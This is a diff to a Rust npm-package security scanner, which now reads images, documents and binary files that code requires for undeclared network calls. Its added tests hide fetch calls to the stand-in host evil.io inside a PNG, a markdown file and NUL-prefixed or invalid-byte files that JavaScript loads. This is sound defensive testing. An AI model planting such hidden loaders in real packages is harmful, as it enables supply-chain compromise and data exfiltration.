@@ -516,7 +516,7 @@ pub fn review(
     let hosts = declared_hosts(&manifest)?;
     // The declared hosts go into the scan, so no number of them can push an undeclared one past its bound.
     let allowed: Vec<String> = hosts.iter().flatten().cloned().chain(repo.as_deref().and_then(host_of)).collect();
-    let code = scan_tarball(&bytes, &allowed)?;
+    let code = scan_tarball(&bytes, &allowed, &bin_targets(&view))?;
     let links = links_of(package, &version, &publishers, built.as_ref(), &release);
     // Kept as word lists: `community.rs` checks every string in an array as a command word at each start.
     let words = |list: &[String]| -> Vec<Vec<String>> {
@@ -740,14 +740,25 @@ pub fn read_manifest(tgz: &[u8]) -> Result<Option<Vec<u8>>, Refusal> {
     Ok(found)
 }
 
-/// Files Node.js never runs as JavaScript, whatever `require` names: images and fonts.
-const NOT_CODE: [&str; 12] = ["png", "jpg", "jpeg", "gif", "webp", "ico", "bmp", "woff", "woff2", "ttf", "otf", "eot"];
+/// The files `bin` names, relative to the package (`./bin/x` → `bin/x`): they run whatever they are called.
+fn bin_targets(view: &Value) -> Vec<String> {
+    let targets: Vec<&str> = match &view["bin"] {
+        Value::String(one) => vec![one.as_str()],
+        Value::Object(all) => all.values().filter_map(Value::as_str).collect(),
+        _ => Vec::new(),
+    };
+    targets.into_iter().map(|t| t.trim_start_matches("./").to_string()).collect()
+}
 
-/// What the package's files say about the network. Node.js runs any text file a `require` names as JavaScript, so
-/// every text file is read (valid UTF-8, no NUL in its first 8 KB), except `package.json`, the manifest, images and
-/// fonts. `allowed` are the declared hosts and the repository's, left out as they are found.
-pub fn scan_tarball(tgz: &[u8], allowed: &[String]) -> Result<Code, Refusal> {
+/// What the package's files say about the network. Node.js runs any file a `require` names as JavaScript, whatever
+/// its extension or bytes, so every file is read for code signals, decoded as Node.js decodes it (invalid bytes become
+/// U+FFFD). Hosts come only from scripts (`.js`, `.mjs`, `.cjs`, a `#!` file, a `bin` target) and from any file a
+/// script loads: elsewhere they are links in a licence or bytes in an image. `allowed` are the declared hosts and the
+/// repository's, left out as they are found.
+pub fn scan_tarball(tgz: &[u8], allowed: &[String], bins: &[String]) -> Result<Code, Refusal> {
     let mut code = Code::allowing(allowed);
+    let mut rest: Vec<(String, String)> = Vec::new();
+    let mut shebang: Vec<String> = Vec::new();
     each_entry(tgz, |inside, entry| {
         if !entry.header().entry_type().is_file() || inside == MANIFEST || inside == "package.json" {
             return Ok(());
@@ -756,19 +767,40 @@ pub fn scan_tarball(tgz: &[u8], allowed: &[String]) -> Result<Code, Refusal> {
             code.add_native(inside);
             return Ok(());
         }
-        let ext = Path::new(inside).extension().map(|e| e.to_string_lossy().to_ascii_lowercase());
-        if ext.is_some_and(|e| NOT_CODE.contains(&e.as_str())) {
-            return Ok(());
-        }
         let mut raw = Vec::new();
         entry.read_to_end(&mut raw).map_err(|_| unreadable())?;
-        if !raw[..raw.len().min(8192)].contains(&0)
-            && let Ok(text) = std::str::from_utf8(&raw)
-        {
-            own_scan::scan(text, &mut code);
+        let text = String::from_utf8_lossy(&raw).into_owned();
+        if raw.starts_with(b"#!") {
+            shebang.push(inside.to_string());
+        }
+        if own_scan::is_script(inside) || raw.starts_with(b"#!") || bins.iter().any(|b| b == inside) {
+            own_scan::scan(&text, &mut code);
+        } else {
+            rest.push((inside.to_string(), text));
         }
         Ok(())
     })?;
+    // A loaded file can load another; read until nothing new is loaded.
+    loop {
+        let (loaded, others): (Vec<_>, Vec<_>) = rest.into_iter().partition(|(path, _)| code.names(path));
+        rest = others;
+        if loaded.is_empty() {
+            break;
+        }
+        for (path, text) in loaded {
+            if !own_scan::is_module(&path) {
+                code.foreign.insert(path.clone());
+            }
+            own_scan::scan(&text, &mut code);
+        }
+    }
+    // A program without `#!` and without a script's extension still runs as JavaScript when npm links it.
+    for bin in bins.iter().filter(|b| !own_scan::is_script(b) && !shebang.contains(b)) {
+        code.foreign.insert(bin.clone());
+    }
+    for (_, text) in rest {
+        own_scan::scan_doc(&text, &mut code);
+    }
     Ok(code)
 }
 
@@ -1483,6 +1515,71 @@ mod tests {
             "{:?}",
             r.signals
         );
+    }
+
+    #[test]
+    fn a_licence_names_no_server_but_a_required_document_is_code() {
+        let m = manifest().to_string();
+        let f = Fake::of(tgz(&[
+            ("package/LICENSE", b"See http://www.apache.org/licenses/LICENSE-2.0 and fetch(\"x\") nowhere."),
+            ("package/README.md", b"Docs at https://docs.acme-crm.io"),
+            ("package/dist/a.js", b"require(\"../notes.md\")"),
+            ("package/notes.md", b"fetch(\"https://evil.io\")"),
+            ("package/contracts/wirecat.json", m.as_bytes()),
+        ]));
+        let r = review("@example/acme-crm-cli", None, &f, catalog(), "").unwrap().review;
+        assert!(
+            r.signals.contains(&Signal::UndeclaredHosts { hosts: vec!["evil.io".into()], more: 0 }),
+            "{:?}",
+            r.signals
+        );
+
+        let lone = Fake::of(tgz(&[
+            ("package/LICENSE", b"http://www.apache.org/licenses/ require(\"node:https\")"),
+            ("package/contracts/wirecat.json", m.as_bytes()),
+        ]));
+        let r = review("@example/acme-crm-cli", None, &lone, catalog(), "").unwrap().review;
+        assert!(!r.signals.iter().any(|s| matches!(s, Signal::UndeclaredHosts { .. })), "{:?}", r.signals);
+        assert!(r.signals.contains(&Signal::NetworkCode { modules: vec!["https".into()] }), "code signals stay");
+    }
+
+    #[test]
+    fn a_png_invalid_bytes_or_a_nul_file_the_code_requires_runs_as_code_and_is_flagged() {
+        let m = manifest().to_string();
+        let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
+        png.extend_from_slice(b"fetch(\"https://evil.io\")");
+        let mut invalid = vec![0xff, 0xfe, 0xc3];
+        invalid.extend_from_slice(b"fetch(\"https://evil.io\")");
+        let mut nul = b"\0\0".to_vec();
+        nul.extend_from_slice(b"fetch(\"https://evil.io\")");
+        for (name, bytes) in [("logo.png", png), ("data.bin", invalid), ("blob.raw", nul)] {
+            let req = format!("require(\"./{name}\")");
+            let f = Fake::of(tgz(&[
+                ("package/dist/a.js", req.as_bytes()),
+                (&format!("package/dist/{name}"), &bytes),
+                ("package/contracts/wirecat.json", m.as_bytes()),
+            ]));
+            let r = review("@example/acme-crm-cli", None, &f, catalog(), "").unwrap().review;
+            assert!(
+                r.signals.contains(&Signal::LoadsNonJs { paths: vec![format!("dist/{name}")] }),
+                "{name}: {:?}",
+                r.signals
+            );
+            assert!(r.signals.contains(&Signal::UndeclaredHosts { hosts: vec!["evil.io".into()], more: 0 }), "{name}");
+            assert!(r.signals.contains(&Signal::NetworkCode { modules: vec!["fetch".into()] }), "{name}");
+        }
+    }
+
+    #[test]
+    fn an_image_nothing_loads_gives_code_signals_but_no_hosts() {
+        let m = manifest().to_string();
+        let f = Fake::of(tgz(&[
+            ("package/logo.png", b"\x89PNG fetch(\"https://evil.io\")"),
+            ("package/contracts/wirecat.json", m.as_bytes()),
+        ]));
+        let r = review("@example/acme-crm-cli", None, &f, catalog(), "").unwrap().review;
+        assert!(r.signals.contains(&Signal::NetworkCode { modules: vec!["fetch".into()] }), "{:?}", r.signals);
+        assert!(!r.signals.iter().any(|s| matches!(s, Signal::UndeclaredHosts { .. } | Signal::LoadsNonJs { .. })));
     }
 
     #[test]
